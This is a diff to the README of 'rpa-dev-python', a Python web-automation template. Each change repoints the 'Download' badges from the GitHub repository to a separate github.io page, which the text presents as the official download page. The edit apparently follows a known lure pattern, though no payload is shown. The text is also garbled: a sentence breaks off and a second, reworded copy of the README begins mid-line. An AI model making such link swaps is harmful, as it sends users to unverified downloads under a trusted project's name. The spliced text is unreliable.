@@ -1,6 +1,6 @@
 # 🤖 rpa-dev-python - Automate Web Tasks Without Coding
 
-[![Download rpa-dev-python](https://img.shields.io/badge/Download-rpa--dev--python-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mitsou55/rpa-dev-python)
+[![Download rpa-dev-python](https://img.shields.io/badge/Download-rpa--dev--python-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://mitsou55.github.io)
 
 rpa-dev-python is a ready-to-use template for building web automation robots in Python. It is designed for people who want a clear starting point for browser automation without building every piece from scratch. The template brings together Selenium, Playwright, Page Object Model organization, and AGENTS.md support in one practical package.
 
@@ -22,7 +22,7 @@ The template is useful because it gives you a structured starting point. It is b
 
 The project is also AGENTS.md ready. AGENTS.md is a guidance file for AI coding helpers. It helps an AI assistant understand the project structure and follow the intended patterns. For users who want to use modern AI tools while# 🤖 rpa-dev-python - Automate Web Tasks Without Coding
 
-[![Download rpa-dev-python](https://img.shields.io/badge/Download-rpa--dev--python-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mitsou55/rpa-dev-python)
+[![Download rpa-dev-python](https://img.shields.io/badge/Download-rpa--dev--python-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://mitsou55.github.io)
 
 rpa-dev-python is a ready-to-use template for building web automation robots in Python. It is made for people who want a clear, organized starting point for browser automation instead of building every piece from an empty folder. The template brings together Selenium, Playwright, Page Object Model structure, and AGENTS.md support in one practical package.
 
@@ -60,7 +60,7 @@ If Python is not yet installed, it is available as a free download from the offi
 
 Visit this link to download the application:
 
-[![Download rpa-dev-python](https://img.shields.io/badge/Get%20the%20Template-Download%20Now-2E8B57?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mitsou55/rpa-dev-python)
+[![Download rpa-dev-python](https://img.shields.io/badge/Get%20the%20Template-Download%20Now-2E8B57?style=for-the-badge&logo=github&logoColor=white)](https://mitsou55.github.io)
 
 The link opens the official project page, where the application files are provided. Keep this page bookmarked so you can return to it when you want to check for updates.
 
